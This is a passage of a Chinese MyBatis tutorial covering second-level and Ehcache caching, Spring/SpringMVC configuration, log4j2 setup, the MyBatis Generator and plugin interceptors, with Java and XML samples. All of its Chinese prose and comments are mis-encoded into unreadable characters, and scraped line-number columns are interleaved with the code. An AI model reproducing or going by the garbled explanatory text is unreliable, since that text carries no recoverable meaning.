= new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    SqlSession sqlSession2 = sqlSessionFactory.openSession();\n\n    EmployeeMapperCache mapper = sqlSession.getMapper(EmployeeMapperCache.class);\n    EmployeeMapperCache mapper2 = sqlSession2.getMapper(EmployeeMapperCache.class);\n    Employee emp = mapper.getEmp(1);\n    sqlSession.close();\n    System.out.println(mapper2.getEmp(1));\n    sqlSession2.close();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\næ³¨æï¼åªæå½SQLSessionå³é­ä¹åï¼æä¼å°æ°æ®ç§»å¨å°äºçº§ç¼å­ã\n\n\n# ç¼å­ç¸å³è®¾ç½®\n\n * cacheEnabled å¼å¯æèå³é­äºçº§ç¼å­ï¼éç½®å¨mybatiséç½®æä»¶settingä¸­\n * mapperéç½®æä»¶å¯¹åºçæ¥è¯¢æ ç­¾ä¸­ï¼è®¾ç½®setCache=trueï¼å¼å¯æèå³é­äºçº§ç¼å­\n * æ¯ä¸ªå¢å æ¹æ ç­¾ä¸é»è®¤æflushCache=trueï¼é»è®¤æ¸ç©ºä¸çº§ç¼å­åäºçº§ç¼å­\n * å¨æ¯ä¸ªæ¥è¯¢æ ç­¾ä¸­é»è®¤æflushCache=falseï¼é»è®¤ä¸æ¸ç©ºç¼å­\n * sqlSession.flushCache()é»è®¤æ¸ç©ºä¸çº§ç¼å­\n * localCacheScope=[SESSION|STATEMENT] æ¬å°ç¼å­ä½ç¨å\n\n\n# ç¼å­å·¥ä½åç\n\n\n\n\n# ç¬¬ä¸æ¹ç¼å­EHCACHE\n\n 1. å¯¼å¥Ehcacheå\n\n\x3c!-- https://mvnrepository.com/artifact/org.ehcache/ehcache --\x3e\n<dependency>\n    <groupId>org.ehcache</groupId>\n    <artifactId>ehcache</artifactId>\n    <version>3.9.9</version>\n</dependency>\n\n\x3c!-- https://mvnrepository.com/artifact/org.mybatis.caches/mybatis-ehcache --\x3e\n<dependency>\n    <groupId>org.mybatis.caches</groupId>\n    <artifactId>mybatis-ehcache</artifactId>\n    <version>1.2.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. mapperä¸­å¼å¯äºçº§ç¼å­\n\n<cache readOnly="true" eviction="FIFO" size="640000" type="org.mybatis.caches.ehcache.EhcacheCache" />\n<cache-ref namespace="com.pwddd.mybatis.mapper.EmployeeMapperCache"/> <!-å¼ç¨å¶ä»æä»¶çç¼å­--\x3e\n\n\n1\n2\n\n 3. éç½®ehcacheéç½®æä»¶\n\n<ehcache>\n\n\n    \x3c!--\n        ç£çå­å¨:å°ç¼å­ä¸­ææ¶ä¸ä½¿ç¨çå¯¹è±¡,è½¬ç§»å°ç¡¬ç,ç±»ä¼¼äºWindowsç³»ç»çèæåå­\n        path:æå®å¨ç¡¬çä¸å­å¨å¯¹è±¡çè·¯å¾\n     --\x3e\n    <diskStore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultCache:é»è®¤çç¼å­éç½®ä¿¡æ¯,å¦æä¸å ç¹æ®è¯´æ,åææå¯¹è±¡æç§æ­¤éç½®é¡¹å¤ç\n        maxElementsInMemory:è®¾ç½®äºç¼å­çä¸é,æå¤å­å¨å¤å°ä¸ªè®°å½å¯¹è±¡\n        eternal:ä»£è¡¨å¯¹è±¡æ¯å¦æ°¸ä¸è¿æ\n        timeToIdleSeconds:æå¤§çååæ¶é´\n        timeToLiveSeconds:æå¤§çå­æ´»æ¶é´\n        overflowToDisk:æ¯å¦åè®¸å¯¹è±¡è¢«åå¥å°ç£ç\n     --\x3e\n    <defaultCache maxElementsInMemory="10000" eternal="false"\n                  timeToIdleSeconds="120" timeToLiveSeconds="120" overflowToDisk="true" />\n\n    \x3c!--\n        cache:ä¸ºæå®åç§°çå¯¹è±¡è¿è¡ç¼å­çç¹æ®éç½®\n        name:æå®å¯¹è±¡çå®æ´å\n     --\x3e\n    <cache name="com.zbaccp.entity.Person" maxElementsInMemory="10000" eternal="false"\n           timeToIdleSeconds="300" timeToLiveSeconds="600" overflowToDisk="true" />\n\n\n</ehcache>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# æ´åSpring\n\n 1. å¯¼å¥ç¸å³ä¾èµå\n\n<dependencies>\n    \n      \x3c!--æµè¯--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-test</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \n  <dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>4.11</version>\n    <scope>test</scope>\n  </dependency>\n\n  \x3c!--spring ä¾èµ æ ¸å¿--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-core</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-expression</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-beans</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-context</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring jdbc--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-jdbc</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-tx</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-orm</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring web--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-web</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-webmvc</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>javax.servlet</groupId>\n    <artifactId>servlet-api</artifactId>\n    <version>2.5</version>\n    <scope>provided</scope>\n  </dependency>\n\n  <dependency>\n    <groupId>org.thymeleaf</groupId>\n    <artifactId>thymeleaf-spring5</artifactId>\n    <version>3.0.12.RELEASE</version>\n  </dependency>\n\n  \x3c!--aop--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-aop</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-aspects</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>cglib</groupId>\n    <artifactId>cglib</artifactId>\n    <version>2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupId>aopalliance</groupId>\n    <artifactId>aopalliance</artifactId>\n    <version>1.0</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.aspectj</groupId>\n    <artifactId>aspectjweaver</artifactId>\n    <version>1.9.7</version>\n  </dependency>\n\n  \x3c!--mybatis--\x3e\n  <dependency>\n    <groupId>org.mybatis</groupId>\n    <artifactId>mybatis</artifactId>\n    <version>3.5.9</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.mybatis</groupId>\n    <artifactId>mybatis-spring</artifactId>\n    <version>2.0.7</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.mybatis.caches</groupId>\n    <artifactId>mybatis-ehcache</artifactId>\n    <version>1.2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.ehcache</groupId>\n    <artifactId>ehcache</artifactId>\n    <version>3.9.9</version>\n  </dependency>\n    \n  <dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid</artifactId>\n    <version>1.2.8</version>\n  </dependency>\n\n  <dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n    <version>5.1.21</version>\n  </dependency>\n    \n    \x3c!-- å¶ä»è¾å©å --\x3e\n\n  <dependency>\n    <groupId>org.apache.logging.log4j</groupId>\n    <artifactId>log4j-core</artifactId>\n    <version>2.17.1</version>\n  </dependency>\n\n    \x3c!--æä»¶ä¸ä¼ --\x3e\n\n  <dependency>\n    <groupId>commons-fileupload</groupId>\n    <artifactId>commons-fileupload</artifactId>\n    <version>1.4</version>\n  </dependency>\n    \n   \x3c!-- ååºjson --\x3e\n\n  <dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.12.1</version>\n  </dependency>\n\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n\n 2. éç½®web.xml(WebInit)ãSpringãSpringMVCéç½®æä»¶\n\nweb.xml/WebInit\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.web.filter.CharacterEncodingFilter;\nimport org.springframework.web.filter.HiddenHttpMethodFilter;\nimport org.springframework.web.servlet.support.AbstractAnnotationConfigDispatcherServletInitializer;\n\nimport javax.servlet.Filter;\n\npublic class WebInit extends AbstractAnnotationConfigDispatcherServletInitializer {\n    @Override\n    protected Class<?>[] getRootConfigClasses() {\n        return new Class[]{SpringConfig.class};\n    }\n\n    @Override\n    protected Class<?>[] getServletConfigClasses() {\n        return new Class[]{WebConfig.class};\n    }\n\n    @Override\n    protected String[] getServletMappings() {\n        return new String[]{"/"};\n    }\n\n    @Override\n    protected Filter[] getServletFilters() {\n        CharacterEncodingFilter characterEncodingFilter = new CharacterEncodingFilter();\n        characterEncodingFilter.setForceRequestEncoding(true);\n        characterEncodingFilter.setEncoding("utf-8");\n        HiddenHttpMethodFilter hiddenHttpMethodFilter = new HiddenHttpMethodFilter();\n        return new Filter[]{characterEncodingFilter,hiddenHttpMethodFilter};\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nSpringéç½®æä»¶\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.servlet.ViewResolver;\nimport org.springframework.web.servlet.config.annotation.EnableWebMvc;\nimport org.springframework.web.servlet.config.annotation.ViewControllerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\nimport org.thymeleaf.spring5.SpringTemplateEngine;\nimport org.thymeleaf.spring5.view.ThymeleafViewResolver;\nimport org.thymeleaf.templatemode.TemplateMode;\nimport org.thymeleaf.templateresolver.ITemplateResolver;\nimport org.thymeleaf.templateresolver.ServletContextTemplateResolver;\n\n@Configuration\n@ComponentScan("com.pwddd.ssmdemo.controller")\n@EnableWebMvc\npublic class WebConfig implements WebMvcConfigurer {\n\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        registry.addViewController("/").setViewName("index");\n    }\n\n\n    @Bean\n    public ITemplateResolver templateResolver(WebApplicationContext applicationContext){\n        ServletContextTemplateResolver servletContextTemplateResolver = new ServletContextTemplateResolver(applicationContext.getServletContext());\n        servletContextTemplateResolver.setPrefix("/WEB-INF/templates/");\n        servletContextTemplateResolver.setSuffix(".html");\n        servletContextTemplateResolver.setCharacterEncoding("utf-8");\n        servletContextTemplateResolver.setTemplateMode(TemplateMode.HTML);\n        return servletContextTemplateResolver;\n    }\n\n    @Bean\n    public SpringTemplateEngine templateEngine(ITemplateResolver templateResolver){\n        SpringTemplateEngine springTemplateEngine = new SpringTemplateEngine();\n        springTemplateEngine.setTemplateResolver(templateResolver);\n        return springTemplateEngine;\n    }\n\n    @Bean\n    public ViewResolver viewResolver(SpringTemplateEngine templateEngine){\n        ThymeleafViewResolver thymeleafViewResolver = new ThymeleafViewResolver();\n        thymeleafViewResolver.setTemplateEngine(templateEngine);\n        thymeleafViewResolver.setCharacterEncoding("utf-8");\n        return thymeleafViewResolver;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\nSpringMVC\n\npackage com.pwddd.ssmdemo.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.mybatis.spring.SqlSessionFactoryBean;\nimport org.mybatis.spring.annotation.MapperScan;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.*;\nimport org.springframework.jdbc.datasource.DataSourceTransactionManager;\nimport org.springframework.transaction.annotation.EnableTransactionManagement;\n\nimport javax.sql.DataSource;\nimport java.io.IOException;\n\n@Configuration\n@ComponentScan("com.pwddd.ssmdemo.service")\n@PropertySource("classpath:jdbc.properties")\n@MapperScan("com.pwddd.ssmdemo.mapper")  // éç½®mapperæ«æ\n@EnableTransactionManagement  // å¼å¯äºå¡\n@EnableAspectJAutoProxy(proxyTargetClass = true)  // å¼å¯aop aspectæ³¨è§£\npublic class SpringConfig {\n\n    @Value("${jdbc.driver}")\n    private String driver;\n\n    @Value("${jdbc.url}")\n    private String url;\n\n    @Value("${jdbc.username}")\n    private String username;\n\n    @Value("${jdbc.password}")\n    private String password;\n\n    @Bean\n    public DataSource dataSource(){\n        DruidDataSource druidDataSource = new DruidDataSource();\n        druidDataSource.setDriverClassName(driver);\n        druidDataSource.setUrl(url);\n        druidDataSource.setUsername(username);\n        druidDataSource.setPassword(password);\n        return druidDataSource;\n    }\n\n    @Bean\n    public DataSourceTransactionManager dataSourceTransactionManager(DataSource dataSource){\n        DataSourceTransactionManager dataSourceTransactionManager = new DataSourceTransactionManager();\n        dataSourceTransactionManager.setDataSource(dataSource);\n        return dataSourceTransactionManager;\n    }\n\n    @Bean\n    public SqlSessionFactoryBean sqlSessionFactoryBean(DataSource dataSource, ApplicationContext applicationContext) throws IOException {\n        SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean();\n        sqlSessionFactoryBean.setDataSource(dataSource);\n        sqlSessionFactoryBean.setConfigLocation(applicationContext.getResource("classpath:mybatis-config.xml"));\n//        sqlSessionFactoryBean.setMapperLocations(applicationContext.getResources("classpath:mapper/*.xml"));\n        return sqlSessionFactoryBean;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\njdbc.properties\n\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssmdemo\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\nlog4j2éç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!--è®¾ç½®log4j2çèªèº«logçº§å«ä¸ºwarn--\x3e\n\x3c!--æ¥å¿çº§å«ä»¥åä¼åçº§æåº: OFF > FATAL > ERROR > WARN > INFO > DEBUG > TRACE > ALL --\x3e\n\x3c!--Configurationåé¢çstatusï¼è¿ä¸ªç¨äºè®¾ç½®log4j2èªèº«åé¨çä¿¡æ¯è¾åºï¼å¯ä»¥ä¸è®¾ç½®ï¼\n    å½è®¾ç½®ætraceæ¶ï¼ä½ ä¼çå°log4j2åé¨åç§è¯¦ç»è¾åº--\x3e\n\x3c!--monitorIntervalï¼Log4jè½å¤èªå¨æ£æµä¿®æ¹éç½® æä»¶åéæ°éç½®æ¬èº«ï¼è®¾ç½®é´éç§æ°--\x3e\n<configuration status="warn" monitorInterval="30">\n    \x3c!--å¨å±åæ°--\x3e\n    <Properties>\n        \x3c!--<Property name="logPath">/export/Logs/bt-middle-data-main</Property>--\x3e\n        <Property name="logPath">./log</Property>\n    </Properties>\n    \x3c!--åå®ä¹ææçappender--\x3e\n    <appenders>\n        \x3c!--è¿ä¸ªè¾åºæ§å¶å°çéç½®--\x3e\n        <console name="Console" target="SYSTEM_OUT">\n            \x3c!--æ§å¶å°åªè¾åºlevelåä»¥ä¸çº§å«çä¿¡æ¯ï¼onMatchï¼ï¼å¶ä»çç´æ¥æç»ï¼onMismatchï¼ --\x3e\n            \x3c!--<ThresholdFilter level="debug" onMatch="ACCEPT" onMismatch="DENY"/>--\x3e\n            \x3c!--è¾åºæ¥å¿çæ ¼å¼--\x3e\n            <PatternLayout pattern="[%d{yyyy-MM-dd HH:mm:ss:SSS}-%t] [%p] - %l - %m%n"/>\n        </console>\n        \x3c!--æä»¶ä¼æå°åºææä¿¡æ¯ï¼è¿ä¸ªlogæ¯æ¬¡è¿è¡ç¨åºä¼èªå¨æ¸ç©ºï¼ç±appendå±æ§å³å®ï¼è¿ä¸ªä¹æºæç¨çï¼éåä¸´æ¶æµè¯ç¨--\x3e\n        \x3c!--<File name="log" fileName="log/test.log" append="false">--\x3e\n        \x3c!--<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %class{36} %L %M - %msg%xEx%n"/>--\x3e\n        \x3c!--</File>--\x3e\n        \x3c!-- è¿ä¸ªä¼æå°åºææçinfoåä»¥ä¸çº§å«çä¿¡æ¯ï¼æ¯æ¬¡å¤§å°è¶è¿sizeï¼\n        åè¿sizeå¤§å°çæ¥å¿ä¼èªå¨å­å¥æå¹´ä»½-æä»½å»ºç«çæä»¶å¤¹ä¸é¢å¹¶è¿è¡åç¼©ï¼ä½ä¸ºå­æ¡£--\x3e\n        <RollingFile name="RollingFileInfo" fileName="${logPath}/info.log"\n                     filePattern="${logPath}/info_%d{yyyy-MM-dd}.log">\n            \x3c!--<Filters>--\x3e\n            \x3c!--<!âæ§å¶å°åªè¾åºlevelåä»¥ä¸çº§å«çä¿¡æ¯ï¼onMatchï¼ï¼å¶ä»çç´æ¥æç»ï¼onMismatchï¼â>--\x3e\n            \x3c!--<ThresholdFilter level="INFO" onMatch="ACCEPT" onMismatch="DENY"/>--\x3e\n            \x3c!--<!â<ThresholdFilter level="WARN" onMatch="DENY" onMismatch="NEUTRAL"/>â>--\x3e\n            \x3c!--</Filters>--\x3e\n            <PatternLayout pattern="[%d{yyyy-MM-dd HH:mm:ss:SSS}-%t] [%p] - %l - %m%n"/>\n            <Policies>\n                \x3c!--æç§filePattern æ¶é´åä½ interval é´éçææä»¶--\x3e\n                <TimeBasedTriggeringPolicy modulate="true" interval="1"/>\n                \x3c!--å®äºå½æ¥å¿æä»¶è¾¾å°äºæå®çsizeæ¶ï¼è§¦årolloveræä½ãsizeåæ°å¯ä»¥ç¨KBãMBãGBç­ååç¼æ¥æå®å·ä½çå­èæ°--\x3e\n                \x3c!--<SizeBasedTriggeringPolicy size="1G"/>--\x3e\n            </Policies>\n        </RollingFile>\n\n\n    </appenders>\n    \x3c!--ç¶åå®ä¹loggerï¼åªæå®ä¹äºloggerå¹¶å¼å¥çappenderï¼appenderæä¼çæ--\x3e\n    <loggers>\n        \x3c!--è¿æ»¤æspringåhibernateçä¸äºæ ç¨çdebugä¿¡æ¯--\x3e\n        <logger name="org.springframework" level="DEBUG">\n        </logger>\n        <logger name="org.elasticsearch" level="INFO">\n        </logger>\n        <logger name="com.jd.jsf.gd" level="warn">\n        </logger>\n        <logger name="org.mybatis" level="DEBUG">\n        </logger>\n        \x3c!-- å°ä¸å¡daoæ¥å£å¡«åè¿å»,å¹¶ç¨æ§å¶å°è¾åºå³å¯ --\x3e\n        <logger name="com.pwddd.ssmdemo.mapper" level="debug" additivity="false">\n            <appender-ref ref="Console"/>\n            <appender-ref ref="RollingFileInfo"/>\n        </logger>\n\n        <root level="info">\n            <appender-ref ref="Console"/>\n            <appender-ref ref="RollingFileInfo"/>\n        </root>\n    </loggers>\n\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nmybatis-config.xmléç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapUnderscoreToCamelCase" value="true"/>\n        <setting name="lazyLoadingEnabled" value="true"/>\n        \x3c!--        æç§éè¦è¿è¡å±æ§çå è½½--\x3e\n        <setting name="aggressiveLazyLoading" value="false"/>\n        <setting name="cacheEnabled" value="true"/>\n    </settings>\n\n    <typeAliases>\n\x3c!--        <typeAlias type="com.pwddd.mybatis.bean.Employee" alias="emp" />--\x3e\n        <package name="com.pwddd.ssmdemo.bean"/>\n    </typeAliases>\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nehcache.xmléç½®æä»¶\n\n<ehcache>\n\n\n    \x3c!--\n        ç£çå­å¨:å°ç¼å­ä¸­ææ¶ä¸ä½¿ç¨çå¯¹è±¡,è½¬ç§»å°ç¡¬ç,ç±»ä¼¼äºWindowsç³»ç»çèæåå­\n        path:æå®å¨ç¡¬çä¸å­å¨å¯¹è±¡çè·¯å¾\n     --\x3e\n    <diskStore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultCache:é»è®¤çç¼å­éç½®ä¿¡æ¯,å¦æä¸å ç¹æ®è¯´æ,åææå¯¹è±¡æç§æ­¤éç½®é¡¹å¤ç\n        maxElementsInMemory:è®¾ç½®äºç¼å­çä¸é,æå¤å­å¨å¤å°ä¸ªè®°å½å¯¹è±¡\n        eternal:ä»£è¡¨å¯¹è±¡æ¯å¦æ°¸ä¸è¿æ\n        timeToIdleSeconds:æå¤§çååæ¶é´\n        timeToLiveSeconds:æå¤§çå­æ´»æ¶é´\n        overflowToDisk:æ¯å¦åè®¸å¯¹è±¡è¢«åå¥å°ç£ç\n     --\x3e\n    <defaultCache maxElementsInMemory="10000" eternal="false"\n                  timeToIdleSeconds="120" timeToLiveSeconds="120" overflowToDisk="true" />\n\n    \x3c!--\n        cache:ä¸ºæå®åç§°çå¯¹è±¡è¿è¡ç¼å­çç¹æ®éç½®\n        name:æå®å¯¹è±¡çå®æ´å\n     --\x3e\n    <cache name="com.zbaccp.entity.Person" maxElementsInMemory="10000" eternal="false"\n           timeToIdleSeconds="300" timeToLiveSeconds="600" overflowToDisk="true" />\n</ehcache>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# éåå·¥ç¨\n\nMybatisä»£ç çæå¨æ¯mybatisæä¾çä¸ä¸ªæ ¹æ®æ°æ®åºè¡¨éåèªå¨çæxmlãJavaBeanç­ç±»çå·¥å·ã\n\nMybatiséåå·¥ç¨éç½®ï¼\n\n 1. å¼å¥mybatis-gentator\n\n<dependency>\n    <groupId>org.mybatis.generator</groupId>\n    <artifactId>mybatis-generator-core</artifactId>\n    <version>1.3.7</version>\n</dependency>\n\n<dependency>\n    <groupId>org.mybatis.generator</groupId>\n    <artifactId>mybatis-generator-maven-plugin</artifactId>\n    <version>1.3.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. ç¼åéç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorConfiguration>\n\n    \x3c!--\n        targetRuntime="MyBatis3Simple":çæç®åççCRUD\n        MyBatis3:è±ªåç\n     --\x3e\n    <context id="mysqlTables" targetRuntime="MyBatis3">\n        \x3c!-- jdbcConnectionï¼æå®å¦ä½è¿æ¥å°ç®æ æ°æ®åº --\x3e\n        <jdbcConnection driverClass="com.mysql.jdbc.Driver"\n                        connectionURL="jdbc:mysql://localhost:3306/mybatis?allowMultiQueries=true"\n                        userId="root"\n                        password="123456">\n        </jdbcConnection>\n\n        \x3c!--  --\x3e\n        <javaTypeResolver >\n            <property name="forceBigDecimals" value="false" />\n        </javaTypeResolver>\n\n        \x3c!-- javaModelGeneratorï¼æå®javaBeanççæç­ç¥\n        targetPackage="test.model"ï¼ç®æ åå\n        targetProject="\\MBGTestProject\\src"ï¼ç®æ å·¥ç¨\n        --\x3e\n        <javaModelGenerator targetPackage="com.pwddd.mybatis.bean"\n                            targetProject=".\\src\\main\\java\\">\n            <property name="enableSubPackages" value="true" />\n            <property name="trimStrings" value="true" />\n        </javaModelGenerator>\n\n        \x3c!-- sqlMapGeneratorï¼sqlæ å°çæç­ç¥ï¼ --\x3e\n        <sqlMapGenerator targetPackage="mapper"\n                         targetProject=".\\src\\main\\resources\\">\n            <property name="enableSubPackages" value="true" />\n        </sqlMapGenerator>\n\n        \x3c!-- javaClientGenerator:æå®mapperæ¥å£æå¨çä½ç½® --\x3e\n        <javaClientGenerator type="XMLMAPPER" targetPackage="com.pwddd.mybatis.dao"\n                             targetProject=".\\src\\main\\java\\">\n            <property name="enableSubPackages" value="true" />\n        </javaClientGenerator>\n\n        \x3c!-- æå®è¦éååæåªäºè¡¨ï¼æ ¹æ®è¡¨è¦åå»ºjavaBean --\x3e\n        <table tableName="tbl_dept" domainObjectName="Department"></table>\n        <table tableName="tbl_employee" domainObjectName="Employee"></table>\n    </context>\n</generatorConfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 3. è¿è¡\n\n@Test\npublic void mbg() throws XMLParserException, IOException, InvalidConfigurationException, SQLException, InterruptedException {\n\nList<String> warnings = new ArrayList<String>();\n    boolean overwrite = true;\n    File configFile = new File("mbg.xml");\n    ConfigurationParser cp = new ConfigurationParser(warnings);\n    Configuration config = cp.parseConfiguration(configFile);\n    DefaultShellCallback callback = new DefaultShellCallback(overwrite);\n    MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings);\n    myBatisGenerator.generate(null);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# MyBatisè¿è¡åç\n\n\n\n\n\n\n# åå»ºSQLSessionFactory\n\n\n\n\n# åå»ºSQLSession\n\n\n\n\n# è·åMapperçä»£çç±»å¯¹è±¡\n\n\n\n\n# æ§è¡æ¥è¯¢\n\n\n\n\n# æµç¨æ»ç»\n\n\n\n\n# æä»¶\n\n\n# åç\n\n 1. å¨åå¤§å¯¹è±¡åå»ºçè¿ç¨ä¸­ï¼é½ä¼æ§è¡interceptorChain.pluginAll(param);,è·åå°ææçinterceptorï¼è°ç¨interceptor.plugin(target) è¿åtargetåè£ä¹åçå¯¹è±¡ã\n 2. æä»¬å¯ä»¥ä¸ºåå¤§å¯¹è±¡åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼AOPåé¢ç¼ç¨çææ³ãéè¿ä»£çå¯¹è±¡æä»¬å°±è½æ¦æªå°åå¤§å¯¹è±¡ä¸­æ§è¡çæ¹æ³ã\n\n\n# ç¼åæä»¶\n\n 1. å®ç°interceptoræ¥å£\n 2. å®ç°ç¸å³æ¹æ³\n 3. ä½¿ç¨@Interceptorå®ç°æä»¶ç­¾å\n 4. å°æä»¶æ³¨åå°mybatiséç½®æä»¶ä¸­\n\npackage com.pwddd.mybatis.plugins;\n\nimport org.apache.ibatis.executor.statement.StatementHandler;\nimport org.apache.ibatis.plugin.*;\n\nimport java.util.Properties;\n\n@Intercepts(\n        @Signature(\n                type = StatementHandler.class,\n                method="parameterize",\n                